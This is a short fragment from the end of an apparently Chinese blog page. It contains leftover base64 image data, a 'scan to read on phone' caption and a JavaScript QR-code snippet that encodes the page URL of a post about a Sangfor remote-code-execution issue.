uMonLxQvk19N3Gg1L7/mp4FIcNnrTqANBPx0wWPcbbdOOv6oDV8RvGa41CQWhguKkyX+DQTvM2tp/Rg4B8ZowDEQqiEw/YLZBtJUl/PSE7gG8tLjnxf/HwAAAP//YtljdAAAAAZJREFUAwAQVWaSoaru4wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-netConfig-add\_DNS-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 